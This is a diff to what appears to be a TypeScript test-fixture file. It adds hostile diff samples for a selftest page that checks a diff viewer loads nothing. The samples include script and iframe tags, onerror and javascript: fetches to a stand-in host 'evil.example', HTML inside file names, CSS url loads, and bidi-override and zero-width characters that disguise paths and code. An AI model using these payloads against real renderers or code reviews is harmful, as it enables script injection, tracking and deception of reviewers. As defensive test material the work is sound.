@@ -31,4 +31,29 @@ export const EVIL_SAMPLES: { id: string; md: string }[] = [
   { id: 'css-in-md-table', md: `| a |\n|---|\n| <span style="background:url(${E}/29.png)">x</span> |` },
 ]
 
+// W4: hostile diffs (07 「diff」): HTML and scripts in lines and in file names, javascript: links, bidi overrides and
+// zero-width characters in paths. Rendered on the selftest page through DiffView (desktop: @pierre/diffs) with every
+// file open; nothing may load.
+export const EVIL_DIFFS: { id: string; diff: string }[] = [
+  { id: 'diff-html-lines', diff: [
+    'diff --git a/README.md b/README.md', '--- a/README.md', '+++ b/README.md', '@@ -1,2 +1,3 @@',
+    `-<img src="${E}/d1.png" onerror="fetch('${E}/d2')">`,
+    `+<script src="${E}/d3.js"></script><script>fetch('${E}/d4')</script>`,
+    `+<iframe src="${E}/d5"></iframe><link rel="stylesheet" href="${E}/d6.css"><style>@import url(${E}/d7.css)</style>`,
+    `+[点我](javascript:fetch('${E}/d8')) <a href="javascript:alert(1)">x</a> <svg><image href="${E}/d9.png"/></svg>`,
+  ].join('\n') },
+  { id: 'diff-html-names', diff: [
+    `diff --git a/<img src=${E}/d10.png>.ts b/<img src=${E}/d10.png>.ts`,
+    `--- a/<img src=${E}/d10.png>.ts`, `+++ b/<img src=${E}/d10.png>.ts`, '@@ -1 +1 @@', '-a', `+<video src="${E}/d11.mp4" autoplay></video>`,
+    'diff --git a/x.js b/<script>alert(1)<\/script>.js', 'rename from x.js', 'rename to <script>alert(1)<\/script>.js',
+  ].join('\n') },
+  { id: 'diff-bidi-path', diff: [
+    'diff --git a/src/safe\u202egpj.ts b/src/safe\u202egpj.ts', '--- a/src/safe\u202egpj.ts', '+++ b/src/safe\u202egpj.ts',
+    '@@ -1 +1 @@', '-const ok = true', '+const ok = false \u2067// \u2066looks fine\u2069\u200b',
+  ].join('\n') },
+  { id: 'diff-css-in-code', diff: [
+    '--- a/style.css', '+++ b/style.css', '@@ -1 +1 @@', '-body{}', `+body{background:url(${E}/d12.png)} @font-face{src:url(${E}/d13.woff)}`,
+  ].join('\n') },
+]
+
 export const EVIL_HOST = 'evil.example'
